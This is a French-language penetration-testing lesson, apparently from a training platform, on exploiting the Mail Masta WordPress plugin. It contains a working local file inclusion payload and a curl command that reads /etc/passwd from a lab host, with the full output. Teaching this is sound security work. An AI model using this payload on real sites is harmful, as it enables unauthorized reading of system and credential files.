Exploiter un plugin vulnérable
==============================

* * * * *

Tirer parti des résultats de WPScan
-----------------------------------

Le rapport généré par WPScan nous indique que le site Web utilise une ancienne version de WordPress (5.3.2) et un thème obsolète appelé `Twenty Twenty`. WPScan a identifié deux plugins vulnérables, `Mail Masta 1.0`et `Google Review Slider`. Cette version du `Mail Masta`plugin est connue pour être vulnérable à l'injection SQL ainsi qu'à l'inclusion de fichiers locaux (LFI). Le résultat du rapport contient également des URL vers des PoC, qui fournissent des informations sur la manière d'exploiter ces vulnérabilités.

Vérifions si le LFI peut être exploité sur la base de ce [rapport](https://www.exploit-db.com/exploits/40290/) exploit-db . L'exploit indique que tout utilisateur non authentifié peut lire les fichiers locaux via le chemin : `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`.

#### LFI utilisant le navigateur

![](https://academy.hackthebox.com/storage/modules/17/WP_lfi.png)

* * * * *

Nous pouvons également valider cette vulnérabilité en utilisant cURL sur la ligne de commande.

#### LFI utilisant cURL

  LFI utilisant cURL

```
dsgsec@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false

```

Nous avons validé avec succès la vulnérabilité à l'aide des données générées dans le `WPScan`rapport. Maintenant, essayons nous-mêmes !
